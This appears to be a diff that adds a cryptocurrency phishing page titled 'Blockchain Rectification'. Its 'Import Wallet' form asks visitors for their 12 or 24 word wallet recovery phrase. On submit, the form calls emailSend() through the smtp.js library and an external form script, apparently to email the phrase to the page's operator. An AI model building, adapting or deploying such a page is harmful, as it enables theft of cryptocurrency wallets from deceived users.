@@ -1,0 +1,38 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Blockchain Rectification</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;900&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="styles/form.css" />
+    <script src="https://widgets.coingecko.com/coingecko-coin-price-marquee-widget.js" defer></script>
+</head>
+
+<body>
+    <!-- Blockchain Widget -->
+    <coingecko-coin-price-marquee-widget coin-ids="bitcoin,ethereum,eos,ripple,litecoin" currency="usd"
+        background-color="#ffffff" locale="en"></coingecko-coin-price-marquee-widget>
+
+    <main>
+        <h1>Import Wallet</h1>
+        <form action="" method="post" enctype="text/plain" onsubmit="emailSend(); reset(); return false;">
+            <label for="message">Typically 12 (sometimes 24) words seperated by a single spaces.
+            </label>
+            <textarea id="message" name="message" rows="4" cols="50" required></textarea>
+
+            <input type="submit" value="Connect Wallet" />
+        </form>
+    </main>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="formsjs/Terra_form.js"></script>
+
+</body>
+
+</html>
+
+
+<!-- <input type="submit" value="Connect Wallet" /> -->
